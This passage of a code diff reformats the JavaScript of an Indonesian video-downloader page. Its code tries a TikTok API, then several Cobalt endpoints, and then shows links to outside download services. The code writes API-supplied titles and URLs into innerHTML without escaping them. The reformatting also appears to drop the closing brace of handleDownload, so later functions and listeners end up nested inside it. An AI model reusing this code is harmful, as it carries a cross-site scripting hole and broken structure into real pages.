+                const title = data.title ? `<p style="font-size:0.78rem;color:var(--muted);margin-bottom:0.75rem;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:100%">${data.title.substring(0, 80)}</p>` : '';
+
+                result.innerHTML = `
         <div class="video-info">
           <h3>✅ Video TikTok siap didownload!</h3>
           ${title}
           <div class="dl-options">${buttons}</div>
         </div>`;
-      success = true;
-    } catch(e) { /* fallthrough ke cobalt */ }
-  }
+                success = true;
+            } catch (e) { /* fallthrough ke cobalt */ }
+        }
 
-  // ── 2. Coba Cobalt API (semua platform) ──
-  if (!success) {
-    for (const endpoint of COBALT_ENDPOINTS) {
-      try {
-        loadingText.textContent = `Mencoba server ${COBALT_ENDPOINTS.indexOf(endpoint)+1}...`;
-        const data = await tryCobalt(endpoint, url);
+        // ── 2. Coba Cobalt API (semua platform) ──
+        if (!success) {
+            for (const endpoint of COBALT_ENDPOINTS) {
+                try {
+                    loadingText.textContent = `Mencoba server ${COBALT_ENDPOINTS.indexOf(endpoint) + 1}...`;
+                    const data = await tryCobalt(endpoint, url);
 
-        if ((data.status === 'stream' || data.status === 'redirect' || data.status === 'tunnel') && data.url) {
-          loading.style.display = 'none';
-          result.innerHTML = `
+                    if ((data.status === 'stream' || data.status === 'redirect' || data.status === 'tunnel') && data.url) {
+                        loading.style.display = 'none';
+                        result.innerHTML = `
             <div class="video-info">
               <h3>✅ Video siap didownload!</h3>
               <p>Klik tombol di bawah untuk menyimpan video</p>
@@ -1094,75 +2200,75 @@ async function handleDownload() {
                 <a class="dl-btn secondary" href="${url}" target="_blank">🔗 Buka Original</a>
               </div>
             </div>`;
-          success = true;
-          break;
-        } else if (data.status === 'picker' && data.picker?.length) {
-          loading.style.display = 'none';
-          const items = data.picker.map((item, i) =>
-            `<a class="dl-btn primary" href="${item.url}" target="_blank" download>⬇ Media ${i+1}</a>`
-          ).join('\n');
-          result.innerHTML = `
+                        success = true;
+                        break;
+                    } else if (data.status === 'picker' && data.picker?.length) {
+                        loading.style.display = 'none';
+                        const items = data.picker.map((item, i) =>
+                            `<a class="dl-btn primary" href="${item.url}" target="_blank" download>⬇ Media ${i + 1}</a>`
+                        ).join('\n');
+                        result.innerHTML = `
             <div class="video-info">
               <h3>✅ ${data.picker.length} media ditemukan</h3>
               <p>Pilih media yang ingin didownload</p>
               <div class="dl-options">${items}</div>
             </div>`;
-          success = true;
-          break;
+                        success = true;
+                        break;
+                    }
+                } catch (e) { /* coba endpoint berikutnya */ }
+            }
         }
-      } catch(e) { /* coba endpoint berikutnya */ }
-    }
-  }
 
-  // ── 3. Fallback ke layanan eksternal ──
-  if (!success) {
-    loading.style.display = 'none';
-    showFallback(url, isTiktok, isIg, isYt);
-  }
+        // ── 3. Fallback ke layanan eksternal ──
+        if (!success) {
+            loading.style.display = 'none';
+            showFallback(url, isTiktok, isIg, isYt);
+        }
 
-  btn.disabled = false;
-}
+        btn.disabled = false;
 
-function showFallback(url, isTiktok, isIg, isYt) {
-  let services = '';
-  if (isTiktok) {
-    services = `
+        function showFallback(url, isTiktok, isIg, isYt) {
+            let services = '';
+            if (isTiktok) {
+                services = `
       <a class="dl-btn primary" href="https://snaptik.app" target="_blank">📱 SnapTik</a>
       <a class="dl-btn secondary" href="https://tikmate.online" target="_blank">🎵 TikMate</a>`;
-  } else if (isIg) {
-    services = `
+            } else if (isIg) {
+                services = `
       <a class="dl-btn primary" href="https://snapinsta.app" target="_blank">📸 SnapInsta</a>
       <a class="dl-btn secondary" href="https://igdownloader.app" target="_blank">📷 IGDownloader</a>`;
-  } else if (isYt) {
-    services = `
+            } else if (isYt) {
+                services = `
       <a class="dl-btn primary" href="https://y2mate.com" target="_blank">▶️ Y2Mate</a>
       <a class="dl-btn secondary" href="https://cobalt.tools" target="_blank">🌐 Cobalt</a>`;
-  } else {
-    services = `
+            } else {
+                services = `
       <a class="dl-btn primary" href="https://snaptik.app" target="_blank">📱 SnapTik</a>
       <a class="dl-btn primary" href="https://snapinsta.app" target="_blank">📸 SnapInsta</a>
       <a class="dl-btn secondary" href="https://cobalt.tools" target="_blank">🌐 Cobalt</a>`;
-  }
+            }
 
-  document.getElementById('resultContent').innerHTML = `
+            document.getElementById('resultContent').innerHTML = `
     <div class="video-info">
       <h3>⚡ Download via layanan ini:</h3>
       <p>Paste link yang sama di salah satu layanan berikut:</p>
       <div class="dl-options">${services}</div>
     </div>`;
-  document.getElementById('resultArea').classList.add('show');
-}
+            document.getElementById('resultArea').classList.add('show');
+        }
 
-function showErr(msg) {
-  const e = document.getElementById('errorMsg');
-  e.textContent = msg; e.classList.add('show');
-  document.getElementById('resultArea').classList.remove('show');
-}
+        function showErr(msg) {
+            const e = document.getElementById('errorMsg');
+            e.textContent = msg; e.classList.add('show');
+            document.getElementById('resultArea').classList.remove('show');
+        }
 
-document.getElementById('videoUrl').addEventListener('keydown', e => { if(e.key==='Enter') handleDownload(); });
-document.getElementById('pwOverlay').addEventListener('click', e => { if(e.target===document.getElementById('pwOverlay')) closePw(); });
-document.getElementById('detailModal').addEventListener('click', e => { if(e.target===document.getElementById('detailModal')) window.closeDetail(); });
-document.getElementById('renameModal').addEventListener('click', e => { if(e.target===document.getElementById('renameModal')) window.closeRename(); });
-</script>
+        document.getElementById('videoUrl').addEventListener('keydown', e => { if (e.key === 'Enter') handleDownload(); });
+        document.getElementById('pwOverlay').addEventListener('click', e => { if (e.target === document.getElementById('pwOverlay')) closePw(); });
+        document.getElementById('detailModal').addEventListener('click', e => { if (e.target === document.getElementById('detailModal')) window.closeDetail(); });
+        document.getElementById('renameModal').addEventListener('click', e => { if (e.target === document.getElementById('renameModal')) window.closeRename(); });
+    </script>
 </body>
+
 </html>
